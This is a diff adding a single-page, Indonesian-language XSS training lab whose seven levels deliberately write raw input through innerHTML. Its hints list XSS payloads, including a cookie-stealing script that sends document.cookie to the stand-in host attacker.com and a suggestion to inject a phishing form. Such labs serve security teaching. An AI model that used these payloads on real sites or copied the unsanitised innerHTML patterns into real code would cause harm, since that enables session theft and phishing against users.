@@ -1,1 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAHZX XSS LAB - HTML Edition</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0d0d0d; color:#e0e0e0; font-family:'Segoe UI',Consolas,monospace; padding:20px; min-height:100vh; }
+        .header { text-align:center; padding:30px; border-bottom:2px solid #1a1a1a; margin-bottom:30px; }
+        .header h1 { color:#ff4444; font-size:2.5em; letter-spacing:3px; text-shadow:0 0 15px rgba(255,0,0,0.5); }
+        .header p { color:#888; margin-top:10px; }
+        .container { max-width:900px; margin:0 auto; }
+        .lab-section { background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:25px; margin-bottom:25px; }
+        .lab-section h2 { color:#ff6666; margin-bottom:15px; font-size:1.4em; border-bottom:1px solid #333; padding-bottom:10px; }
+        .difficulty { display:inline-block; padding:4px 12px; border-radius:20px; font-size:0.7em; font-weight:bold; margin-left:10px; }
+        .easy { background:#1b5e20; color:#66bb6a; }
+        .medium { background:#e65100; color:#ffab40; }
+        .hard { background:#b71c1c; color:#ef5350; }
+        input[type="text"], textarea, select { width:100%; padding:12px; margin:10px 0; background:#0d0d0d; border:1px solid #444; color:#e0e0e0; font-family:Consolas,monospace; font-size:14px; border-radius:4px; outline:none; }
+        input[type="text"]:focus, textarea:focus { border-color:#ff4444; box-shadow:0 0 10px rgba(255,0,0,0.2); }
+        button { background:#ff4444; color:#fff; border:none; padding:12px 25px; cursor:pointer; font-weight:bold; font-size:14px; border-radius:4px; letter-spacing:1px; transition:all 0.3s; }
+        button:hover { background:#ff2222; box-shadow:0 0 15px rgba(255,0,0,0.4); }
+        .output-box { background:#0d0d0d; border:1px dashed #444; padding:15px; margin-top:10px; border-radius:4px; min-height:40px; word-break:break-all; }
+        .comments-display { background:#0d0d0d; border:1px solid #333; padding:15px; margin-top:10px; border-radius:4px; max-height:300px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; }
+        .tooltip { color:#888; font-size:0.8em; display:block; margin-top:-5px; margin-bottom:10px; }
+        .skull-icon { font-size:4em; text-align:center; display:block; animation:pulse 2s infinite; }
+        @keyframes pulse { 0%,100%{ opacity:0.6; } 50%{ opacity:1; } }
+        code { background:#2a2a2a; padding:2px 6px; border-radius:3px; color:#ff8888; font-size:0.9em; }
+        .warning { background:#2a0000; border:1px solid #ff4444; padding:10px; text-align:center; margin-bottom:20px; border-radius:4px; }
+    </style>
+</head>
+<body>
 
+<div class="header">
+    <span class="skull-icon">💀</span>
+    <h1>FAHZX XSS LAB</h1>
+    <p>100% Client-Side · No Backend · Open & Practice</p>
+</div>
+
+<div class="container">
+    <div class="warning">⚠️ Semua input di halaman ini RAW, tidak disanitasi. Untuk latihan di browser lokal saja.</div>
+
+    <!-- Level 1: Reflected XSS via URL Query -->
+    <div class="lab-section">
+        <h2>Level 1: Reflected XSS (URL Query) <span class="difficulty easy">EASY</span></h2>
+        <p>Parameter <code>?name=</code> di URL langsung dimasukkan ke halaman. Coba tambahkan <code>?name=test</code> di URL.</p>
+        <form onsubmit="event.preventDefault(); window.location.search = '?name=' + encodeURIComponent(this.query.value);">
+            <input type="text" id="query" placeholder="Masukkan nama atau payload...">
+            <button type="submit">Inject via URL</button>
+        </form>
+        <div class="output-box">
+            <strong>Output:</strong> 
+            <span id="reflected-get"></span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></span>
+    </div>
+
+    <!-- Level 2: Reflected XSS via Input (POST-like) -->
+    <div class="lab-section">
+        <h2>Level 2: Reflected XSS (Input Box) <span class="difficulty easy">EASY</span></h2>
+        <p>Search bar yang menampilkan input langsung. Mirip POST, tapi client-side.</p>
+        <input type="text" id="searchInput" placeholder="Search sesuatu...">
+        <button onclick="reflectSearch()">Search</button>
+        <div class="output-box">
+            <strong>Hasil pencarian untuk:</strong> 
+            <span id="searchOutput"></span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>&lt;img src=x onerror=alert(1)&gt;</code></span>
+    </div>
+
+    <!-- Level 3: Stored XSS via localStorage -->
+    <div class="lab-section">
+        <h2>Level 3: Stored XSS (localStorage) <span class="difficulty medium">MEDIUM</span></h2>
+        <p>Komentar disimpan di localStorage dan muncul setiap kali halaman dibuka. Payload dieksekusi tiap kali.</p>
+        <textarea id="commentInput" rows="4" placeholder="Tulis komentar atau payload XSS..."></textarea>
+        <button onclick="storeComment()">Post Comment</button>
+        <button onclick="clearComments()" style="background:#444;">Clear All</button>
+        <div class="comments-display" id="storedComments">
+            <strong>Komentar (Stored):</strong><br>
+            <span style="color:#666;">Belum ada komentar.</span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> atau <code>&lt;svg/onload=alert('stored')&gt;</code></span>
+    </div>
+
+    <!-- Level 4: DOM-Based XSS via Hash -->
+    <div class="lab-section">
+        <h2>Level 4: DOM-Based XSS (Hash Fragment) <span class="difficulty medium">MEDIUM</span></h2>
+        <p>Input diambil dari hash URL (#) dan dimasukkan ke DOM tanpa sanitasi. <code>#payload</code></p>
+        <div class="output-box">
+            <strong>Output:</strong> 
+            <span id="domHashOutput">Coba tambahkan # sesuatu di URL</span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>#&lt;img src=x onerror=alert('DOM XSS')&gt;</code></span>
+    </div>
+
+    <!-- Level 5: HTML Injection (Bio) -->
+    <div class="lab-section">
+        <h2>Level 5: HTML Injection <span class="difficulty easy">EASY</span></h2>
+        <p>Bio menerima HTML mentah. Bisa inject form, iframe, dll.</p>
+        <textarea id="bioInput" rows="3" placeholder="Tulis bio HTML kamu..."></textarea>
+        <button onclick="updateBio()">Update Bio</button>
+        <div class="output-box">
+            <strong>Bio:</strong><br>
+            <span id="bioOutput"></span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>&lt;form&gt;&lt;input type='text'&gt;&lt;/form&gt;</code> buat phishing simpel</span>
+    </div>
+
+    <!-- Level 6: Cookie Viewer -->
+    <div class="lab-section">
+        <h2>Level 6: Cookie Viewer (Latihan Steal) <span class="difficulty easy">EASY</span></h2>
+        <p>Lihat cookie yang ada. Gunakan payload XSS dari level lain untuk mencuri ini.</p>
+        <div class="output-box">
+            <strong>Current Cookies:</strong><br>
+            <code id="cookieDisplay"></code>
+        </div>
+        <span class="tooltip">💡 Payload: <code>&lt;script&gt;new Image().src='http://attacker.com/?c='+document.cookie&lt;/script&gt;</code></span>
+    </div>
+
+    <!-- Level 7: Simulated User-Agent Reflection -->
+    <div class="lab-section">
+        <h2>Level 7: Simulated User-Agent Reflection <span class="difficulty hard">HARD</span></h2>
+        <p>Di sini kita simulasi server yang merefleksikan User-Agent. Isi input, bayangkan itu User-Agent yang dimodifikasi pake Burp/curl, lalu lihat refleksinya.</p>
+        <input type="text" id="userAgentInput" placeholder="Isi dengan User-Agent palsu, misal: &lt;script&gt;alert(1)&lt;/script&gt;">
+        <button onclick="reflectUserAgent()">Simulate UA Reflection</button>
+        <div class="output-box">
+            <strong>Your User-Agent (reflected):</strong><br>
+            <span id="uaOutput">Belum ada input</span>
+        </div>
+        <span class="tooltip">💡 Hint: <code>&lt;script&gt;alert('UA XSS')&lt;/script&gt;</code> di kolom ini, lalu lihat outputnya.</span>
+    </div>
+
+</div>
+
+<script>
+    // ==================== LEVEL 1: Reflected XSS via URL Query ====================
+    (function() {
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('name') || '';
+        const output = document.getElementById('reflected-get');
+        // VULNERABLE: langsung pakai innerHTML tanpa sanitasi
+        output.innerHTML = name || '<span style="color:#666;">Belum ada input</span>';
+    })();
+
+    // ==================== LEVEL 2: Reflected XSS (Input Box) ====================
+    function reflectSearch() {
+        const input = document.getElementById('searchInput').value;
+        const output = document.getElementById('searchOutput');
+        // VULNERABLE: innerHTML
+        output.innerHTML = input || '<span style="color:#666;">Ketik sesuatu</span>';
+    }
+
+    // ==================== LEVEL 3: Stored XSS via localStorage ====================
+    function storeComment() {
+        const comment = document.getElementById('commentInput').value;
+        let stored = localStorage.getItem('fahzx_comments') || '';
+        stored += comment + '\n---\n';
+        localStorage.setItem('fahzx_comments', stored);
+        displayStoredComments();
+        document.getElementById('commentInput').value = '';
+    }
+
+    function clearComments() {
+        localStorage.removeItem('fahzx_comments');
+        displayStoredComments();
+    }
+
+    function displayStoredComments() {
+        const container = document.getElementById('storedComments');
+        const comments = localStorage.getItem('fahzx_comments') || '';
+        // VULNERABLE: innerHTML
+        container.innerHTML = '<strong>Komentar (Stored):</strong><br>' + 
+            (comments ? comments.replace(/\n/g, '<br>') : '<span style="color:#666;">Belum ada komentar.</span>');
+    }
+
+    // Load stored comments on page load
+    displayStoredComments();
+
+    // ==================== LEVEL 4: DOM-Based XSS via Hash ====================
+    function injectHash() {
+        const hash = window.location.hash.substring(1);
+        const output = document.getElementById('domHashOutput');
+        // VULNERABLE: innerHTML
+        output.innerHTML = hash || 'Coba tambahkan # sesuatu di URL';
+    }
+    window.addEventListener('hashchange', injectHash);
+    window.addEventListener('load', injectHash);
+
+    // ==================== LEVEL 5: HTML Injection (Bio) ====================
+    function updateBio() {
+        const bio = document.getElementById('bioInput').value;
+        document.getElementById('bioOutput').innerHTML = bio || '<span style="color:#666;">Bio kosong</span>';
+    }
+
+    // ==================== LEVEL 6: Cookie Viewer ====================
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('cookieDisplay').textContent = document.cookie || 'No cookies';
+        // Set some dummy cookies for practice
+        document.cookie = "session=fahzx_demo; path=/";
+        document.cookie = "token=eyJhbGciOiJIUzI1NiJ9.fake; path=/";
+        document.getElementById('cookieDisplay').textContent = document.cookie;
+    });
+
+    // ==================== LEVEL 7: Simulated User-Agent Reflection ====================
+    function reflectUserAgent() {
+        const ua = document.getElementById('userAgentInput').value;
+        document.getElementById('uaOutput').innerHTML = ua || '<span style="color:#666;">Tidak ada input</span>';
+    }
+</script>
+
+</body>
+</html>
